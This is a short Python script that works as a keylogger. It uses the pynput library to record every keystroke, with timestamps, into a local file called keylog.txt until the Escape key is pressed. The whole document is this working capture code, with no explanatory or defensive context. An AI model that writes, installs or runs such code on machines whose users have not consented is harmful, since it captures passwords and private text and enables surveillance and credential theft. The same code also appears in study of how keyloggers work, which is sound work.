from pynput import keyboard
import logging


logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')


STOP_KEY = keyboard.Key.esc

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

    
    if key == STOP_KEY:
        return False  

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
